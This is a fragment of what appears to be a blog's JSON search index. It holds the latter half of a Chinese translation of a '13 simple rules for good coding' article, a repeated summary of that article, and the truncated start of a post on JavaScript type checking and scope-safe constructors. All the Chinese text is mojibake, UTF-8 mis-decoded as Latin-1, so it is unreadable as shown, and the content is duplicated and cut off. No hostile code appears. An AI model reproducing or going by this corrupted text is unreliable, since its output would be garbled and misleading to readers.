åº”è¯¥æ˜ç™½å®ƒå°†è¦åšä»€ä¹ˆï¼Œå®ƒå°†å¦‚ä½•ä½¿ç”¨ï¼Œæ¨¡å—ï¼ŒæœåŠ¡å¦‚ä½•ç›¸äº’å·¥ä½œï¼Œå®ƒå°†æœ‰ä»€ä¹ˆç»“æ„ï¼Œå¦‚ä½•è¿›è¡Œæµ‹è¯•å’Œè°ƒè¯•ï¼Œä»¥åŠå¦‚ä½•æ›´æ–°ã€‚\n3. æµ‹è¯•è¦†ç›–ç‡ æµ‹è¯•æ˜¯å¥½äº‹ï¼Œä½†ä»–ä»¬å¹¶ä¸æ€»æ˜¯è´Ÿæ‹…å¾—èµ·ï¼Œå¯¹é¡¹ç›®æœ‰æ„ä¹‰ã€‚\nå½“ä½ éœ€è¦æµ‹è¯•ï¼š\nå½“ä½ ç¼–å†™æ¨¡å—æ—¶ï¼Œå¾®æœåŠ¡å°†ä¸ä¼šè¢«è§¦åŠè‡³å°‘ä¸€ä¸ªæœˆã€‚ å½“ä½ ç¼–å†™å¼€æºä»£ç ã€‚ å½“ä½ ç¼–å†™æ¶‰åŠé‡‘èæ¸ é“çš„æ ¸å¿ƒä»£ç æˆ–ä»£ç ã€‚ å½“æ‚¨æœ‰ä»£ç æ›´æ–°çš„åŒæ—¶æ›´æ–°æµ‹è¯•çš„èµ„æºã€‚ å½“ä½ ä¸éœ€è¦æµ‹è¯•æ—¶ï¼š\nå½“ä½ æ˜¯ä¸€ä¸ªåˆ›ä¸šã€‚ å½“ä½ æœ‰å°å›¢é˜Ÿå’Œä»£ç æ›´æ”¹æ˜¯å¿«é€Ÿã€‚ å½“ä½ ç¼–å†™çš„è„šæœ¬ï¼Œå¯ä»¥ç®€å•åœ°é€šè¿‡ä»–ä»¬çš„è¾“å‡ºæ‰‹åŠ¨æµ‹è¯•ã€‚ è®°ä½ï¼Œå¸¦æœ‰ä¸¥æ ¼æµ‹è¯•çš„ä»£ç å¯èƒ½æ¯”æ²¡æœ‰æµ‹è¯•çš„ä»£ç æ›´æœ‰å®³ã€‚\n4. ä¿æŒç®€å•ï¼Œæåº¦ç®€å• ä¸è¦ç¼–å†™å¤æ‚çš„ä»£ç ã€‚æ›´å¤šæ›´ç®€å•ï¼Œé‚£ä¹ˆæ›´å°‘çš„é”™è¯¯å®ƒå¯èƒ½æœ‰å’Œæ›´å°‘çš„æ—¶é—´æ¥è°ƒè¯•å®ƒä»¬ã€‚ä»£ç åº”è¯¥åšçš„åªæ˜¯å®ƒéœ€è¦æ²¡æœ‰éå¸¸å¤šçš„æŠ½è±¡å’Œå…¶ä»–OOP shitï¼ˆå°¤å…¶æ˜¯æ¶‰åŠjavaå¼€å‘äººå‘˜ï¼‰+ 20ï¼…çš„ä¸œè¥¿å¯èƒ½éœ€è¦åœ¨å°†æ¥ä»¥ç®€å•çš„æ–¹å¼æ›´æ–°å®ƒã€‚\n5. æ³¨é‡Š å‡ºç°æ³¨é‡Šè¯´æ˜ä½ çš„ä»£ç ä¸å¤Ÿå¥½ã€‚å¥½çš„ä»£ç åº”è¯¥æ˜¯å¯ä»¥ç†è§£çš„ï¼Œæ²¡æœ‰ä¸€è¡Œæ³¨é‡Šã€‚ä½†æ˜¯å¦‚ä½•ä¸ºæ–°å¼€å‘äººå‘˜èŠ‚çœæ—¶é—´ï¼Ÿ - ç¼–å†™ç®€å•çš„å†…è”æ–‡æ¡£æè¿°ä»€ä¹ˆå’Œå¦‚ä½•æ–¹æ³•å·¥ä½œã€‚è¿™å°†èŠ‚çœå¾ˆå¤šæ—¶é—´æ¥ç†è§£ï¼Œç”šè‡³æ›´å¤š - å®ƒå°†ç»™äººä»¬æ›´å¤šçš„æœºä¼šæ¥æå‡ºæ›´å¥½çš„å®æ–½è¿™ç§æ–¹æ³•ã€‚å¹¶ä¸”å®ƒå°†æ˜¯å…¨çƒä»£ç æ–‡æ¡£çš„è‰¯å¥½å¼€ç«¯ã€‚\n6. ç¡¬è€¦åˆVSè¾ƒå°è€¦åˆ å§‹ç»ˆå°è¯•ä½¿ç”¨å¾®æœåŠ¡æ¶æ„ã€‚å•ç‰‡è½¯ä»¶å¯ä»¥æ¯”å¾®æœåŠ¡è½¯ä»¶è¿è¡Œå¾—æ›´å¿«ï¼Œä½†åªèƒ½åœ¨ä¸€ä¸ªæœåŠ¡å™¨çš„ä¸Šä¸‹æ–‡ä¸­è¿è¡Œã€‚ å¾®æœåŠ¡ä½¿æ‚¨å¯ä»¥ä¸ä»…åœ¨è®¸å¤šæœåŠ¡å™¨ä¸Šï¼Œè€Œä¸”æœ‰æ—¶ç”šè‡³åœ¨ä¸€å°æœºå™¨ä¸Šï¼ˆæˆ‘çš„æ„æ€æ˜¯è¿‡ç¨‹åˆ†å‘ï¼‰é«˜æ•ˆåœ°åˆ†å‘æ‚¨çš„è½¯ä»¶ã€‚\n7. ä»£ç å®¡æŸ¥ ä»£ç å®¡æŸ¥å¯ä»¥æ˜¯å¥½çš„ï¼Œä¹Ÿä»¥æ˜¯åçš„ã€‚ æ‚¨å¯ä»¥ç»„ç»‡ä»£ç å®¡æŸ¥ï¼Œåªæœ‰å½“æ‚¨æœ‰å¼€å‘äººå‘˜äº†è§£95ï¼…çš„ä»£ç ï¼Œè°å¯ä»¥ç›‘æ§æ‰€æœ‰æ›´æ–°ï¼Œè€Œä¸æµªè´¹å¾ˆå¤šæ—¶é—´ã€‚åœ¨å…¶ä»–æƒ…å†µä¸‹ï¼Œè¿™å°†æ˜¯åªæ˜¯è€—æ—¶ï¼Œæ¯ä¸ªäººéƒ½ä¼šè®¨åŒè¿™ä¸ªã€‚\nåœ¨è¿™éƒ¨åˆ†æœ‰å¾ˆå¤šé—®é¢˜ï¼Œæ‰€ä»¥æ›´æ·±å…¥åœ°æè¿°è¿™ä¸€ç‚¹ã€‚\nè®¸å¤šäººè®¤ä¸ºä»£ç å®¡æŸ¥æ˜¯ä¸€ä¸ªå¾ˆå¥½çš„æ–¹å¼æ•™æ–°æ‰‹ï¼Œæˆ–è€…å·¥ä½œåœ¨ä¸åŒéƒ¨åˆ†çš„ä»£ç çš„é˜Ÿå‹ã€‚ä½†æ˜¯ä»£ç å®¡æŸ¥çš„ä¸»è¦ç›®æ ‡æ˜¯ä¿æŒä»£ç è´¨é‡ï¼Œè€Œä¸æ˜¯æ•™å­¦ã€‚è®©æˆ‘ä»¬æƒ³è±¡ä½ çš„å›¢é˜Ÿåˆ¶ä½œä»£ç ç”¨äºæ§åˆ¶æ ¸ååº”å †æˆ–å¤ªç©ºç«ç®­å‘åŠ¨æœºçš„å†·å´ç³»ç»Ÿã€‚ä½ åœ¨éå¸¸ç¡¬çš„é€»è¾‘ä¸­çŠ¯äº†å·¨å¤§çš„é”™è¯¯ï¼Œç„¶åä½ ç»™è¿™ä¸ªä»£ç å®¡æŸ¥æ–°çš„å®¶ä¼™ã€‚ä½ æ€ä¹ˆè®¤ä¸ºä¼šå‘ç”Ÿæ„å¤–çš„é£é™©ï¼Ÿ - æˆ‘çš„ç»ƒä¹ ç‡è¶…è¿‡70ï¼…ã€‚\nè‰¯å¥½çš„å›¢é˜Ÿæ˜¯æ¯ä¸ªäººéƒ½æœ‰è‡ªå·±çš„è§’è‰²ï¼Œè´Ÿè´£ç¡®åˆ‡çš„å·¥ä½œã€‚å¦‚æœæœ‰äººæƒ³è¦ç†è§£å¦ä¸€æ®µä»£ç ï¼Œé‚£ä¹ˆä»–å»ä¸€ä¸ªè´Ÿè´£ä»»å»é—®ä»–ã€‚ä½ ä¸å¯èƒ½çŸ¥é“ä¸€åˆ‡ï¼Œæ›´å¥½çš„ä¼˜ç§€çš„ç†è§£å°å—ä»£ç è€Œä¸æ˜¯ç†è§£æ‰€æœ‰ã€‚\n8. é‡æ„æ²¡å•¥ç”¨ åœ¨æˆ‘çš„èŒä¸šç”Ÿæ¶¯ä¸­ï¼Œæˆ‘å¬åˆ°å¾ˆå¤šæ¬¡â€œä¸è¦æ‹…å¿ƒï¼Œæˆ‘ä»¬ä»¥åä¼šé‡æ„å®ƒâ€ã€‚åœ¨æœªæ¥ï¼Œè¿™ä¼šå¯¼è‡´å¤§çš„æŠ€æœ¯å€ºåŠ¡æˆ–ä»å¤´å¼€å§‹åˆ é™¤æ‰€æœ‰çš„ä»£ç å’Œå†™ä½œã€‚\næ‰€ä»¥ï¼Œä¸è¦å¾—åˆ°ä¸€ä¸ªå€ºåŠ¡ï¼Œé™¤éä½ æœ‰é’±ä»å¤´å¼€å‘ä½ çš„è½¯ä»¶å‡ æ¬¡ã€‚\n9. å½“ä½ ç´¯äº†æˆ–åœ¨ä¸€ä¸ªåçš„å¿ƒæƒ…ä¸è¦å†™ä»£ç ã€‚ å½“å¼€å‘äººå‘˜åŒå€¦æ—¶ï¼Œä»–ä»¬æ­£åœ¨åˆ¶é€ 2åˆ°5å€æˆ–è€…æ›´å¤šçš„bugã€‚æ‰€ä»¥å·¥ä½œæ›´å¤šæ˜¯éå¸¸ç³Ÿç³•çš„åšæ³•ã€‚è¿™å°±æ˜¯ä¸ºä»€ä¹ˆè¶Šæ¥è¶Šå¤šçš„å›½å®¶æ€è€ƒ6å°æ—¶å·¥ä½œæ—¥ï¼Œå…¶ä¸­ä¸€äº›å·²ç»æœ‰äº†ã€‚ç²¾ç¥å·¥ä½œä¸åŒäºä½¿ç”¨ä½ çš„äºŒå¤´è‚Œã€‚\n10. ä¸è¦ä¸€æ¬¡å†™å…¨éƒ¨ - ä½¿å¼€å‘è¿­ä»£ åœ¨ç¼–å†™ä»£ç åˆ†æå’Œé¢„æµ‹ä¹‹å‰ï¼Œæ‚¨çš„å®¢æˆ·/å®¢æˆ·çœŸæ­£éœ€è¦ä»€ä¹ˆï¼Œç„¶åé€‰æ‹©æ‚¨å¯ä»¥åœ¨çŸ­æœŸå†…ä»¥é«˜è´¨é‡å¼€å‘çš„MVFï¼ˆæœ€æœ‰ä»·å€¼çš„åŠŸèƒ½ï¼‰ã€‚ä½¿ç”¨è¿™æ ·çš„è¿­ä»£æ¥éƒ¨ç½²è´¨é‡æ›´æ–°ï¼Œè€Œä¸æ˜¯è…°éƒ¨æ—¶é—´å’Œèµ„æºå¯¹ä¸åˆç†çš„æ„¿æœ›å’Œç‰ºç‰²ä¸è´¨é‡ã€‚\n11. è‡ªåŠ¨åŒ–VSæ‰‹åŠ¨ è‡ªåŠ¨åŒ–æ˜¯é•¿æœŸçš„100ï¼…æˆåŠŸã€‚æ‰€ä»¥å¦‚æœä½ æœ‰èµ„æºè‡ªåŠ¨åŒ–çš„ä¸œè¥¿ï¼Œç°åœ¨åº”è¯¥åšã€‚ä½ å¯èƒ½è®¤ä¸ºâ€œåªéœ€è¦5åˆ†é’Ÿï¼Œä¸ºä»€ä¹ˆæˆ‘åº”è¯¥è‡ªåŠ¨åŒ–ï¼Ÿä½†è®©æˆ‘è®¡ç®—è¿™ä¸ªã€‚ä¾‹å¦‚ï¼Œå®ƒæ˜¯5ä¸ªå¼€å‘äººå‘˜çš„æ—¥å¸¸ä»»åŠ¡ã€‚ 5åˆ†é’Ÿ* 5å¤©* 21å¤©* 12ä¸ªæœˆ= 6 300åˆ†é’Ÿ= 105å°æ—¶= 13.125å¤©ã€œ5250 $ã€‚ å¦‚æœä½ æœ‰40 000åå‘˜å·¥ï¼Œè¿™å°†éœ€è¦å¤šå°‘è´¹ç”¨ï¼Ÿ\n12. å‡ºå»æµªï¼Œå­¦ä¹ æ–°çˆ±å¥½ å·®å¼‚åŒ–å·¥ä½œå¯ä»¥å¢åŠ å¿ƒæ™ºèƒ½åŠ›ï¼Œå¹¶æä¾›æ–°æƒ³æ³•ã€‚æ‰€ä»¥ï¼Œæš‚åœç°åœ¨çš„å·¥ä½œï¼Œå‡ºå»å‘¼å¸ä¸€ä¸‹æ–°é²œç©ºæ°”ï¼Œä¸æœ‹å‹äº¤è°ˆï¼Œå¼¹å‰ä»–ç­‰ã€‚ ps: è«æ˜¥è€…ï¼Œæ˜¥æœæ—¢æˆï¼Œå† è€…äº”å…­äººï¼Œç«¥å­å…­ä¸ƒäººï¼Œæµ´ä¹æ²‚ï¼Œé£ä¹èˆé›©ï¼Œå’è€Œå½’ã€‚------ã€Šè®ºè¯­.å…ˆè¿›ã€‹ã€‚\n13. åœ¨ç©ºé—²æ—¶é—´å­¦ä¹ æ–°äº‹ç‰© å½“äººä»¬åœæ­¢å­¦ä¹ æ—¶ï¼Œä»–ä»¬å¼€å§‹é€€åŒ–ã€‚\n","permalink":"https://wdd.js.org/posts/2018/02/few-simple-rules-for-good-coding-my-15-years-experience/","summary":"åŸæ–‡åœ°å€ï¼šhttps://hackernoon.com/few-simple-rules-for-good-coding-my-15-years-experience-96cb29d4acd9#.ddzpjb80c\nå—¨ï¼Œæˆ‘çš„å·¥ä½œä½œä¸ºä¸€ä¸ªç¨‹åºå‘˜è¶…è¿‡15å¹´ï¼Œå¹¶ä½¿ç”¨è®¸å¤šä¸åŒçš„è¯­è¨€ï¼ŒèŒƒä¾‹ï¼Œæ¡†æ¶å’Œå…¶ä»–ç‹—å±ã€‚æˆ‘æƒ³å’Œå¤§å®¶åˆ†äº«æˆ‘å†™å¥½ä»£ç çš„è§„åˆ™ã€‚\n1. ä¼˜åŒ–VSå¯è¯»æ€§ å»ä»–å¦ˆçš„ä¼˜åŒ– å§‹ç»ˆç¼–â€‹â€‹å†™æ˜“äºé˜…è¯»ä¸”å¯¹å¼€å‘äººå‘˜å¯ç†è§£çš„ä»£ç ã€‚å› ä¸ºåœ¨ç¡¬å¯è¯»ä»£ç ä¸ŠèŠ±è´¹çš„æ—¶é—´å’Œèµ„æºå°†è¿œè¿œé«˜äºä»ä¼˜åŒ–ä¸­è·å¾—çš„ã€‚ å¦‚æœä½ éœ€è¦è¿›è¡Œä¼˜åŒ–ï¼Œé‚£ä¹ˆä½¿å®ƒåƒDIçš„ç‹¬ç«‹æ¨¡å—ï¼Œå…·æœ‰100ï¼…çš„æµ‹è¯•è¦†ç›–ç‡ï¼Œå¹¶ä¸”ä¸ä¼šè¢«è§¦åŠè‡³å°‘ä¸€å¹´ã€‚\n2. æ¶æ„ç¬¬ä¸€ æˆ‘çœ‹åˆ°å¾ˆå¤šäººè¯´â€œæˆ‘ä»¬éœ€è¦å¿«é€Ÿåšäº‹ï¼Œæˆ‘ä»¬æ²¡æœ‰æ—¶é—´åšæ¶æ„â€ã€‚å…¶ä¸­çº¦99ï¼…çš„äººå› ä¸ºè¿™æ ·çš„æƒ³æ³•è€Œé‡åˆ°äº†å¤§é—®é¢˜ã€‚ ç¼–å†™ä»£ç è€Œä¸è€ƒè™‘å…¶æ¶æ„æ˜¯æ²¡æœ‰ç”¨çš„ï¼Œå°±åƒæ²¡æœ‰å®ç°å®ƒä»¬çš„è®¡åˆ’ä¸€æ ·ï¼Œæ¢¦æƒ³ä½ çš„æ„¿æœ›ã€‚ åœ¨ç¼–å†™ä»£ç çš„ç¬¬ä¸€è¡Œä¹‹å‰ï¼Œä½ åº”è¯¥æ˜ç™½å®ƒå°†è¦åšä»€ä¹ˆï¼Œå®ƒå°†å¦‚ä½•ä½¿ç”¨ï¼Œæ¨¡å—ï¼ŒæœåŠ¡å¦‚ä½•ç›¸äº’å·¥ä½œï¼Œå®ƒå°†æœ‰ä»€ä¹ˆç»“æ„ï¼Œå¦‚ä½•è¿›è¡Œæµ‹è¯•å’Œè°ƒè¯•ï¼Œä»¥åŠå¦‚ä½•æ›´æ–°ã€‚\n3. æµ‹è¯•è¦†ç›–ç‡ æµ‹è¯•æ˜¯å¥½äº‹ï¼Œä½†ä»–ä»¬å¹¶ä¸æ€»æ˜¯è´Ÿæ‹…å¾—èµ·ï¼Œå¯¹é¡¹ç›®æœ‰æ„ä¹‰ã€‚\nå½“ä½ éœ€è¦æµ‹è¯•ï¼š\nå½“ä½ ç¼–å†™æ¨¡å—æ—¶ï¼Œå¾®æœåŠ¡å°†ä¸ä¼šè¢«è§¦åŠè‡³å°‘ä¸€ä¸ªæœˆã€‚ å½“ä½ ç¼–å†™å¼€æºä»£ç ã€‚ å½“ä½ ç¼–å†™æ¶‰åŠé‡‘èæ¸ é“çš„æ ¸å¿ƒä»£ç æˆ–ä»£ç ã€‚ å½“æ‚¨æœ‰ä»£ç æ›´æ–°çš„åŒæ—¶æ›´æ–°æµ‹è¯•çš„èµ„æºã€‚ å½“ä½ ä¸éœ€è¦æµ‹è¯•æ—¶ï¼š\nå½“ä½ æ˜¯ä¸€ä¸ªåˆ›ä¸šã€‚ å½“ä½ æœ‰å°å›¢é˜Ÿå’Œä»£ç æ›´æ”¹æ˜¯å¿«é€Ÿã€‚ å½“ä½ ç¼–å†™çš„è„šæœ¬ï¼Œå¯ä»¥ç®€å•åœ°é€šè¿‡ä»–ä»¬çš„è¾“å‡ºæ‰‹åŠ¨æµ‹è¯•ã€‚ è®°ä½ï¼Œå¸¦æœ‰ä¸¥æ ¼æµ‹è¯•çš„ä»£ç å¯èƒ½æ¯”æ²¡æœ‰æµ‹è¯•çš„ä»£ç æ›´æœ‰å®³ã€‚\n4. ä¿æŒç®€å•ï¼Œæåº¦ç®€å• ä¸è¦ç¼–å†™å¤æ‚çš„ä»£ç ã€‚æ›´å¤šæ›´ç®€å•ï¼Œé‚£ä¹ˆæ›´å°‘çš„é”™è¯¯å®ƒå¯èƒ½æœ‰å’Œæ›´å°‘çš„æ—¶é—´æ¥è°ƒè¯•å®ƒä»¬ã€‚ä»£ç åº”è¯¥åšçš„åªæ˜¯å®ƒéœ€è¦æ²¡æœ‰éå¸¸å¤šçš„æŠ½è±¡å’Œå…¶ä»–OOP shitï¼ˆå°¤å…¶æ˜¯æ¶‰åŠjavaå¼€å‘äººå‘˜ï¼‰+ 20ï¼…çš„ä¸œè¥¿å¯èƒ½éœ€è¦åœ¨å°†æ¥ä»¥ç®€å•çš„æ–¹å¼æ›´æ–°å®ƒã€‚\n5. æ³¨é‡Š å‡ºç°æ³¨é‡Šè¯´æ˜ä½ çš„ä»£ç ä¸å¤Ÿå¥½ã€‚å¥½çš„ä»£ç åº”è¯¥æ˜¯å¯ä»¥ç†è§£çš„ï¼Œæ²¡æœ‰ä¸€è¡Œæ³¨é‡Šã€‚ä½†æ˜¯å¦‚ä½•ä¸ºæ–°å¼€å‘äººå‘˜èŠ‚çœæ—¶é—´ï¼Ÿ - ç¼–å†™ç®€å•çš„å†…è”æ–‡æ¡£æè¿°ä»€ä¹ˆå’Œå¦‚ä½•æ–¹æ³•å·¥ä½œã€‚è¿™å°†èŠ‚çœå¾ˆå¤šæ—¶é—´æ¥ç†è§£ï¼Œç”šè‡³æ›´å¤š - å®ƒå°†ç»™äººä»¬æ›´å¤šçš„æœºä¼šæ¥æå‡ºæ›´å¥½çš„å®æ–½è¿™ç§æ–¹æ³•ã€‚å¹¶ä¸”å®ƒå°†æ˜¯å…¨çƒä»£ç æ–‡æ¡£çš„è‰¯å¥½å¼€ç«¯ã€‚\n6. ç¡¬è€¦åˆVSè¾ƒå°è€¦åˆ å§‹ç»ˆå°è¯•ä½¿ç”¨å¾®æœåŠ¡æ¶æ„ã€‚å•ç‰‡è½¯ä»¶å¯ä»¥æ¯”å¾®æœåŠ¡è½¯ä»¶è¿è¡Œå¾—æ›´å¿«ï¼Œä½†åªèƒ½åœ¨ä¸€ä¸ªæœåŠ¡å™¨çš„ä¸Šä¸‹æ–‡ä¸­è¿è¡Œã€‚ å¾®æœåŠ¡ä½¿æ‚¨å¯ä»¥ä¸ä»…åœ¨è®¸å¤šæœåŠ¡å™¨ä¸Šï¼Œè€Œä¸”æœ‰æ—¶ç”šè‡³åœ¨ä¸€å°æœºå™¨ä¸Šï¼ˆæˆ‘çš„æ„æ€æ˜¯è¿‡ç¨‹åˆ†å‘ï¼‰é«˜æ•ˆåœ°åˆ†å‘æ‚¨çš„è½¯ä»¶ã€‚\n7. ä»£ç å®¡æŸ¥ ä»£ç å®¡æŸ¥å¯ä»¥æ˜¯å¥½çš„ï¼Œä¹Ÿä»¥æ˜¯åçš„ã€‚ æ‚¨å¯ä»¥ç»„ç»‡ä»£ç å®¡æŸ¥ï¼Œåªæœ‰å½“æ‚¨æœ‰å¼€å‘äººå‘˜äº†è§£95ï¼…çš„ä»£ç ï¼Œè°å¯ä»¥ç›‘æ§æ‰€æœ‰æ›´æ–°ï¼Œè€Œä¸æµªè´¹å¾ˆå¤šæ—¶é—´ã€‚åœ¨å…¶ä»–æƒ…å†µä¸‹ï¼Œè¿™å°†æ˜¯åªæ˜¯è€—æ—¶ï¼Œæ¯ä¸ªäººéƒ½ä¼šè®¨åŒè¿™ä¸ªã€‚\nåœ¨è¿™éƒ¨åˆ†æœ‰å¾ˆå¤šé—®é¢˜ï¼Œæ‰€ä»¥æ›´æ·±å…¥åœ°æè¿°è¿™ä¸€ç‚¹ã€‚\nè®¸å¤šäººè®¤ä¸ºä»£ç å®¡æŸ¥æ˜¯ä¸€ä¸ªå¾ˆå¥½çš„æ–¹å¼æ•™æ–°æ‰‹ï¼Œæˆ–è€…å·¥ä½œåœ¨ä¸åŒéƒ¨åˆ†çš„ä»£ç çš„é˜Ÿå‹ã€‚ä½†æ˜¯ä»£ç å®¡æŸ¥çš„ä¸»è¦ç›®æ ‡æ˜¯ä¿æŒä»£ç è´¨é‡ï¼Œè€Œä¸æ˜¯æ•™å­¦ã€‚è®©æˆ‘ä»¬æƒ³è±¡ä½ çš„å›¢é˜Ÿåˆ¶ä½œä»£ç ç”¨äºæ§åˆ¶æ ¸ååº”å †æˆ–å¤ªç©ºç«ç®­å‘åŠ¨æœºçš„å†·å´ç³»ç»Ÿã€‚ä½ åœ¨éå¸¸ç¡¬çš„é€»è¾‘ä¸­çŠ¯äº†å·¨å¤§çš„é”™è¯¯ï¼Œç„¶åä½ ç»™è¿™ä¸ªä»£ç å®¡æŸ¥æ–°çš„å®¶ä¼™ã€‚ä½ æ€ä¹ˆè®¤ä¸ºä¼šå‘ç”Ÿæ„å¤–çš„é£é™©ï¼Ÿ - æˆ‘çš„ç»ƒä¹ ç‡è¶…è¿‡70ï¼…ã€‚\nè‰¯å¥½çš„å›¢é˜Ÿæ˜¯æ¯ä¸ªäººéƒ½æœ‰è‡ªå·±çš„è§’è‰²ï¼Œè´Ÿè´£ç¡®åˆ‡çš„å·¥ä½œã€‚å¦‚æœæœ‰äººæƒ³è¦ç†è§£å¦ä¸€æ®µä»£ç ï¼Œé‚£ä¹ˆä»–å»ä¸€ä¸ªè´Ÿè´£ä»»å»é—®ä»–ã€‚ä½ ä¸å¯èƒ½çŸ¥é“ä¸€åˆ‡ï¼Œæ›´å¥½çš„ä¼˜ç§€çš„ç†è§£å°å—ä»£ç è€Œä¸æ˜¯ç†è§£æ‰€æœ‰ã€‚\n8. é‡æ„æ²¡å•¥ç”¨ åœ¨æˆ‘çš„èŒä¸šç”Ÿæ¶¯ä¸­ï¼Œæˆ‘å¬åˆ°å¾ˆå¤šæ¬¡â€œä¸è¦æ‹…å¿ƒï¼Œæˆ‘ä»¬ä»¥åä¼šé‡æ„å®ƒâ€ã€‚åœ¨æœªæ¥ï¼Œè¿™ä¼šå¯¼è‡´å¤§çš„æŠ€æœ¯å€ºåŠ¡æˆ–ä»å¤´å¼€å§‹åˆ é™¤æ‰€æœ‰çš„ä»£ç å’Œå†™ä½œã€‚\næ‰€ä»¥ï¼Œä¸è¦å¾—åˆ°ä¸€ä¸ªå€ºåŠ¡ï¼Œé™¤éä½ æœ‰é’±ä»å¤´å¼€å‘ä½ çš„è½¯ä»¶å‡ æ¬¡ã€‚\n9. å½“ä½ ç´¯äº†æˆ–åœ¨ä¸€ä¸ªåçš„å¿ƒæƒ…ä¸è¦å†™ä»£ç ã€‚ å½“å¼€å‘äººå‘˜åŒå€¦æ—¶ï¼Œä»–ä»¬æ­£åœ¨åˆ¶é€ 2åˆ°5å€æˆ–è€…æ›´å¤šçš„bugã€‚æ‰€ä»¥å·¥ä½œæ›´å¤šæ˜¯éå¸¸ç³Ÿç³•çš„åšæ³•ã€‚è¿™å°±æ˜¯ä¸ºä»€ä¹ˆè¶Šæ¥è¶Šå¤šçš„å›½å®¶æ€è€ƒ6å°æ—¶å·¥ä½œæ—¥ï¼Œå…¶ä¸­ä¸€äº›å·²ç»æœ‰äº†ã€‚ç²¾ç¥å·¥ä½œä¸åŒäºä½¿ç”¨ä½ çš„äºŒå¤´è‚Œã€‚\n10. ä¸è¦ä¸€æ¬¡å†™å…¨éƒ¨ - ä½¿å¼€å‘è¿­ä»£ åœ¨ç¼–å†™ä»£ç åˆ†æå’Œé¢„æµ‹ä¹‹å‰ï¼Œæ‚¨çš„å®¢æˆ·/å®¢æˆ·çœŸæ­£éœ€è¦ä»€ä¹ˆï¼Œç„¶åé€‰æ‹©æ‚¨å¯ä»¥åœ¨çŸ­æœŸå†…ä»¥é«˜è´¨é‡å¼€å‘çš„MVFï¼ˆæœ€æœ‰ä»·å€¼çš„åŠŸèƒ½ï¼‰ã€‚ä½¿ç”¨è¿™æ ·çš„è¿­ä»£æ¥éƒ¨ç½²è´¨é‡æ›´æ–°ï¼Œè€Œä¸æ˜¯è…°éƒ¨æ—¶é—´å’Œèµ„æºå¯¹ä¸åˆç†çš„æ„¿æœ›å’Œç‰ºç‰²ä¸è´¨é‡ã€‚\n11. è‡ªåŠ¨åŒ–VSæ‰‹åŠ¨ è‡ªåŠ¨åŒ–æ˜¯é•¿æœŸçš„100ï¼…æˆåŠŸã€‚æ‰€ä»¥å¦‚æœä½ æœ‰èµ„æºè‡ªåŠ¨åŒ–çš„ä¸œè¥¿ï¼Œç°åœ¨åº”è¯¥åšã€‚ä½ å¯èƒ½è®¤ä¸ºâ€œåªéœ€è¦5åˆ†é’Ÿï¼Œä¸ºä»€ä¹ˆæˆ‘åº”è¯¥è‡ªåŠ¨åŒ–ï¼Ÿä½†è®©æˆ‘è®¡ç®—è¿™ä¸ªã€‚ä¾‹å¦‚ï¼Œå®ƒæ˜¯5ä¸ªå¼€å‘äººå‘˜çš„æ—¥å¸¸ä»»åŠ¡ã€‚ 5åˆ†é’Ÿ* 5å¤©* 21å¤©* 12ä¸ªæœˆ= 6 300åˆ†é’Ÿ= 105å°æ—¶= 13.","title":"ã€è¯‘ã€‘13ç®€å•çš„ä¼˜ç§€ç¼–ç è§„åˆ™ï¼ˆä»æˆ‘15å¹´çš„ç»éªŒï¼‰"},{"content":"0.1. å®‰å…¨ç±»å‹æ£€æµ‹ javascriptå†…ç½®ç±»å‹æ£€æµ‹å¹¶ä¸å¯é  safariæŸäº›ç‰ˆæœ¬ï¼ˆ\u0026lt;4ï¼‰typeofæ­£åˆ™è¡¨è¾¾å¼è¿”å›ä¸ºfunction å»ºè®®ä½¿ç”¨Object.prototype.toString.call()æ–¹æ³•æ£€æµ‹æ•°æ®ç±»å‹\nfunction isArray(value){ return Object.prototype.toString.call(value) === \u0026#34;[object Array]\u0026#34;; } function isFunction(value){ return Object.prototype.toString.call(value) === \u0026#34;[object Function]\u0026#34;; } function isRegExp(value){ return Object.prototype.toString.call(value) === \u0026#34;[object RegExp]\u0026#34;; } function isNativeJSON(){ return window.JSON \u0026amp;\u0026amp; Object.prototype.toString.call(JSON) === \u0026#34;[object JSON]\u0026#34;; } å¯¹äºieä¸­ä¸€COMå¯¹è±¡å½¢å¼å®ç°çš„ä»»ä½•å‡½æ•°ï¼ŒisFunctionéƒ½è¿”å›falseï¼Œå› ä¸ºä»–ä»¬å¹¶éåŸç”Ÿçš„javascriptå‡½æ•°ã€‚\nåœ¨webå¼€å‘ä¸­ï¼Œèƒ½å¤ŸåŒºåˆ†åŸç”Ÿä¸éåŸç”Ÿçš„å¯¹è±¡éå¸¸é‡è¦ã€‚åªæœ‰è¿™æ ·æ‰èƒ½ç¡®åˆ‡çŸ¥é“æŸä¸ªå¯¹è±¡æ˜¯å¦æœ‰å“ªäº›åŠŸèƒ½\nä»¥ä¸Šæ‰€æœ‰çš„æ­£ç¡®æ€§çš„å‰ææ˜¯ï¼šObject.prototype.toStringæ²¡æœ‰è¢«ä¿®æ”¹è¿‡\n0.2. ä½œç”¨åŸŸå®‰å…¨çš„æ„é€ å‡½æ•° function Person(name){ this.name = name; } //ä½¿ç”¨newæ¥åˆ›å»ºä¸€ä¸ªå¯¹è±¡ var one = new Person(\u0026#39;wdd\u0026#39;); //ç›´æ¥è°ƒç”¨æ„é€ å‡½æ•° Person(); ç”±äºthisæ˜¯è¿è¡Œæ—¶åˆ†é…çš„ï¼Œå¦‚æœä½ ä½¿ç”¨newæ¥æ“ä½œï¼ŒthisæŒ‡å‘çš„å°±æ˜¯oneã€‚å¦‚æœç›´æ¥è°ƒç”¨æ„é€ å‡½æ•°ï¼Œé‚£ä¹ˆthisä¼šæŒ‡å‘å…¨å±€å¯¹è±¡window,ç„¶åä½ çš„ä»£ç å°±ä¼šè¦†ç›–windowçš„åŸç”Ÿnameã€‚å¦‚æœæœ‰å…¶ä»–åœ°æ–¹ä½¿ç”¨è¿‡window.name, é‚£ä¹ˆä½ çš„å‡½æ•°å°†ä¼šåŸ‹ä¸‹ä¸€ä¸ªæ·±è—çš„bugã€‚\n==é‚£ä¹ˆï¼Œå¦‚ä½•æ‰èƒ½åˆ›å»ºä¸€ä¸ªä½œç”¨åŸŸå®‰å…¨çš„æ„é€ å‡½æ•°ï¼Ÿ== æ–¹æ³•1\nfunction Person(name){ if(this instanceof Person){ this.name = name; } else{ return new Person(name); } } 1. æƒ°æ€§è½½å…¥å‡½æ•° 